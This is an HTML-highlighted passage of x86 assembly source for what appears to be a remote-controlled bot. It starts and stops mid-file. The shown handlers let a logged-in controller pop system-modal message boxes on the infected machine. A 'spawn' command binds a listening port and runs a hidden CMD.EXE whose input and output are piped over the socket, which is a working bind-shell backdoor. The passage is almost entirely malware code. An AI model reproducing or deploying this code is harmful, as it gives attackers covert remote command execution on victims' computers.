</span><span class="sc1">; displays sytem modal Message Box with given title and message</span><span class="sc0">
</span><span class="sc1">; format: !msgbox "&lt;msg&gt;" "&lt;title&gt;"</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_msgbox</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LF</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">err_cmd_syntax</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endcr</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__err</span><span class="sc0">

            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
            </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'" '</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MB_SYSTEMMODAL</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__end</span><span class="sc0">

</span><span class="sc5">__err</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

</span><span class="sc5">__end</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; spawns a shell on specified port</span><span class="sc0">
</span><span class="sc1">; format: spawn &lt;port&gt;</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_spawn</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LF</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patchcr</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ascii2num</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__err</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; thread param</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bot_shell_thread</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2000h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CreateThread</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">__err</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc5">bot_shell_thread</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">pascal</span><span class="sc0">
            
            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">shell_port</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">arg_end</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">wsocket</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">lsocket</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">processinfo</span><span class="sc4">:</span><span class="sc5">PROCESS_INFORMATION</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">buffer</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc4">:</span><span class="sc2">512</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">read_handle_1</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">write_handle_1</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">read_handle_2</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">write_handle_2</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">arg_start</span><span class="sc0">
            
            </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">__end_bot_shell</span><span class="sc4">&gt;</span><span class="sc0">
    
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">arg_start</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">arg_end</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">dshell</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">sh</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;-</span><span class="sc5">dshell</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]&gt;</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">write_handle_1</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">read_handle_1</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__create_pipe</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__end</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">write_handle_2</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">read_handle_2</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__create_pipe</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__end</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">IPPROTO_TCP</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SOCK_STREAM</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">AF_INET</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_socket</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">lsocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end_bot_shell</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                </span><span class="sc1">; alloc optval ptr</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SO_REUSEADDR</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SOL_SOCKET</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">lsocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_setsockopt</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
    
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; free optval</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__end_bot_shell</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">512</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">; buffer</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_gethostname</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__end_bot_shell</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_gethostbyname</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">

</span><span class="sc5">__end</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__end_bot_shell</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.h_list</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; alloc sockaddr</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">shell_port</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_htons</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">

            </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AF_INET</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">type</span><span class="sc0"> </span><span class="sc5">sockaddr_in</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">lsocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_bind</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">

            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__end_bot_shell</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">lsocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_listen</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__end_bot_shell</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">lsocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_accept</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wsocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end_bot_shell</span><span class="sc0">
                                    </span><span class="sc1">; alloc STARTUPINFO</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">write_handle_2</span><span class="sc0">              </span><span class="sc1">; hStdError</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">write_handle_2</span><span class="sc0">              </span><span class="sc1">; hStdOutput</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">read_handle_1</span><span class="sc0">               </span><span class="sc1">; hStdInput</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; SW_HIDE</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">STARTF_USESHOWWINDOW</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">STARTF_USESTDHANDLES</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">68</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                                                                 
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                                                                  
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__a</span><span class="sc0">                                                            
            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">COMMAND.COM</span><span class="sc4">~</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__b</span><span class="sc0">
</span><span class="sc5">__a</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CMD.EXE</span><span class="sc4">~</span><span class="sc0">
</span><span class="sc5">__b</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">processinfo</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                                                                 
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__c</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CREATE_NEW_CONSOLE</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__d</span><span class="sc0">

</span><span class="sc5">__c</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">__d</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CreateProcessA</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_xsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">68</span><span class="sc0">            </span><span class="sc1">; free </span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end</span><span class="sc0">

</span><span class="sc5">pump_bot_shell</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">processinfo.PI_hProcess</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_GetExitCodeProcess</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">STILL_ACTIVE</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__end_bot_shell</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">read_handle_2</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_PeekNamedPipe</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
